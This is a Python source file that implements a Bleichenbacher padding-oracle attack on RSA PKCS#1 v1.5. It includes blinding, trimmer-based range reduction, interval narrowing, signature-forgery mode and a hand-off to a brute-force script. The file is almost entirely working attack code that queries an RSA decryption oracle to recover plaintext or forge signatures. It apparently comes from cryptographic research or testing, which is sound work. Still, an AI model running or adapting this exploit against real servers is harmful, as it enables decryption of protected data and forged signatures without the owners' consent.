#!/usr/bin/env python3

import subprocess
from .oracle import RSAOracle
from .helpers import *


class BleichenbacherAttacker(object):

    def __init__(self, attacker, n, e, ct, aid, forgery=False):
        if forgery:
            self.original_ct = encode_pkcs1_15(ct)
        else:
            self.original_ct = ct
        self.forgery = forgery
        self.n, self.e = n, e

        """
        In the weak model, we assume the oracle only checks the two first bytes, and if the next 8 bytes are non-zero.
        Due to the particular structure of the message, the upper bound can be reduced.
        """
        self.oracle = RSAOracle(attacker, aid)
        self.B2 = 0x0002010101010101010100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
        self.B3 = 0x0002FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00D301B3B805B895C0D191

    def is_pkcs1_conformant(self, c, s):
        data = (c * pow(s, self.e, self.n)) % self.n
        return self.oracle.oracle_query(data)

    def get_trimmers(self, c):
        print("\t\t[+] Computing possible trimmers...")
        trimmers = set()
        # Upper bound for t, given in the paper : t < 2n/(9B). We use a much smaller 
        # one in our context
        upper_bound_t = 1024
        # Following parameters may be tweaked to improve the number of queries
        little_t_bound = 50
        big_t_bound = 700

        for t in range(2, upper_bound_t):
            # If we have enough trimmers, save some requests...
            if len(trimmers) > 10:
                break
            # For small t, we go through all coprime u such that 2/3 < u/t < 3/2
            if t < little_t_bound:
                u_lower = ceil_div(self.B2 * t, self.B3)
                u_upper = floor_div(self.B3 * t, self.B2) + 1
            # For larger t, we only consider u = t-1 and u = t+1. 
            else:
                u_lower = t - 1
                u_upper = t + 2

            # Above some bound, we only look for one candidate, and break after 
            # finding it.
            if t > big_t_bound and len(trimmers) != 0:
                break

            for u in range(u_lower, u_upper):
                # If we have enough trimmers, save some requests...
                if len(trimmers) > 5:
                    break
                if egcd(t, u)[0] == 1:
                    if self.is_pkcs1_conformant(c, u * mod_inv(t, self.n) % self.n):
                        trimmers |= {(t, u)}

        print("\t\t[+] Possible trimmers computed ({} candidates)".format(len(trimmers)))
        # We need the biggest t for efficient trimming, so we take the lcm of 
        # all the list, with respect for t upper bound
        t_list = [t for t, _ in trimmers]
        if len(t_list) > 1:
            while True:
                t = lcm_list(t_list)
                if t < upper_bound_t:
                    break
                t_list.remove(max(t_list))
        elif len(t_list) == 1:
            t = t_list[0]
        else:
            return 1, 1, 1

        print("\t\t[+] Computing best candidates (u in [{}, {}], t={})...".format(ceil_div(self.B2 * t, self.B3),
                                                                                  floor_div(self.B3 * t, self.B2), t))
        # With this value of t, we look for the highest and lowest u giving a 
        # conforming candidate
        u_min, u_max = t, t
        for u in range(ceil_div(self.B2 * t, self.B3), t):
            if egcd(t, u)[0] == 1:
                if self.is_pkcs1_conformant(c, u * mod_inv(t, self.n) % self.n):
                    u_min = u
                    break
        for u in range(floor_div(self.B3 * t, self.B2), t, -1):
            if egcd(t, u)[0] == 1:
                if self.is_pkcs1_conformant(c, u * mod_inv(t, self.n) % self.n):
                    u_max = u
                    break
        print("\t\t[+] Found u_min, u_max such that t/u_min = {:.2f} and t/u_max = {:.2f}".format(t / u_min, t / u_max))

        return t, u_min, u_max

    def first_range_reduction(self, c, s, holes):
        while not self.is_pkcs1_conformant(c, s):
            # Check if we are in a hole
            for lower, upper in holes:
                # If s is above the upper bound, we can remove the hole
                if s > upper:
                    holes.remove((lower, upper))
                # If incrementing s does not put it in a hole, we do it
                elif s + 1 < lower:
                    s += 1
                    break
                # Otherwise, we are in a hole, and set s to the upper bound
                else:
                    s = upper
        return s

    def search_one_interval(self, c, s, a, b):
        r = 2 * ceil_div(b * s - self.B2, self.n)
        while True:
            s_min = ceil_div(self.B2 + r * self.n, b)
            s_max = ceil_div(self.B3 + r * self.n, a) + 1
            for s_0 in range(s_min, s_max):
                if self.is_pkcs1_conformant(c, s_0):
                    return s_0
            r += 1

    def parallel_thread_search(self, c, s, intervals):
        r = [2 * ceil_div(b * s - self.B2, self.n) for a, b in intervals]
        while True:
            i = 0
            for a, b in intervals:
                s_min = ceil_div(self.B2 + r[i] * self.n, b)
                s_max = floor_div(self.B3 + r[i] * self.n, a) + 1
                for s_0 in range(s_min, s_max):
                    if self.is_pkcs1_conformant(c, s_0):
                        return s_0
                r[i] += 1
                i += 1

    def narrow_set(self, set_m, s):
        new_set = set()
        for a_0, b_0 in set_m:
            r_min = ceil_div(a_0 * s - self.B3 + 1, self.n)
            r_max = floor_div(b_0 * s - self.B2, self.n) + 1
            for r in range(r_min, r_max):
                a_1 = max(a_0, ceil_div(self.B2 + r * self.n, s))
                b_1 = min(b_0, floor_div(self.B3 - 1 + r * self.n, s))
                if a_1 <= b_1:
                    new_set |= {(a_1, b_1)}
        return new_set

    def attack(self):
        timer = Timer()
        timer.start()

        s_0 = 1
        # Step 1a - Blinding (only needed for signature forgery)
        print("\t[+] Blinding...")
        while not self.is_pkcs1_conformant(self.original_ct, s_0):
            s_0 += 1
        c_0 = (self.original_ct * pow(s_0, self.e, self.n)) % self.n
        print("\t[+] Blinding ok in {} queries, in {} s \n".format(self.oracle.nb_queries, timer.get_time()))

        # Step 1b - Trimming
        print("\t[+] Trimming...")
        t, u_min, u_max = self.get_trimmers(c_0)
        a = max(ceil_div(self.B2 * t, u_min), self.B2)
        b = min(floor_div((self.B3 - 1) * t, u_max), self.B3 - 1)
        set_m = {(a, b)}
        trimming_queries = self.oracle.nb_queries
        print("\t[+] Trimming ok\n")

        # Pre-compute a list of "holes" i.e. intervals in which s cannot be found
        holes = []
        for j in range(10000):
            lower = ceil_div(self.B3 + j * self.n, a)
            upper = floor_div(self.B2 + (j + 1) * self.n, b)
            holes.append((lower, upper))

        i = 1
        s = ceil_div(self.n + self.B2, b)
        print("\t[+] Reducing range...")
        while True:
            # Step 2a - First range reduction, with a better bound for s
            if i == 1:
                s = self.first_range_reduction(c_0, s, holes)
                first_range = self.oracle.nb_queries
                print("\t\t[+] First reduction done\n")

            # Step 2b - Searching with more than one interval left
            elif len(set_m) > 1:
                s = self.parallel_thread_search(c_0, s, set_m)

            # Step 2c - Searching with one interval left
            elif len(set_m) == 1:
                a, b = min(set_m)
                s = self.search_one_interval(c_0, s, a, b)

            # Step 3 - Narrowing the set of solutions, and update values for 
            # the next round.
            new_set_m = self.narrow_set(set_m, s)
            i += 1
            # If we get an empty set, we have a problem, so we keep the old set, and search for the next valid candidate
            if len(new_set_m) == 0:
                print("\t\t[-] We got an empty set of intervals, probably due to false positive. We come back to the "
                      "previous step.")
                continue
            set_m = new_set_m

            # Step 4 - If there is only one interval left, with only one value,
            # we got our solution
            if len(set_m) == 1:
                a, b = min(set_m)
            if a == b:
                break
            elif b - a < 0x3000000:
                print("\t\t[+] {} possible values ({} queries - {} min)...".format(b - a, self.oracle.nb_queries,
                                                                                   timer.get_time() / 60))
                print("\t\t[+] Brute-forcing last values...")
                subprocess.run(["./BleichenbacherAttack/final_bruteforce.py", hex(self.n), hex(self.e), hex(c_0),
                                hex(s_0), hex(a), hex(b), "1" if self.forgery else "0"])
                break
            else:
                print("\t\t[+] {} possible values...".format(hex(b-a)))

        total_time = timer.stop()
        print("\t[+] Attack successful in {:.2f} min !\n".format(total_time / 60))
        print("\t[+] {} queries ({} for trimming, {} for first reduction)".format(self.oracle.nb_queries,
                                                                                  trimming_queries,
                                                                                  first_range - trimming_queries))
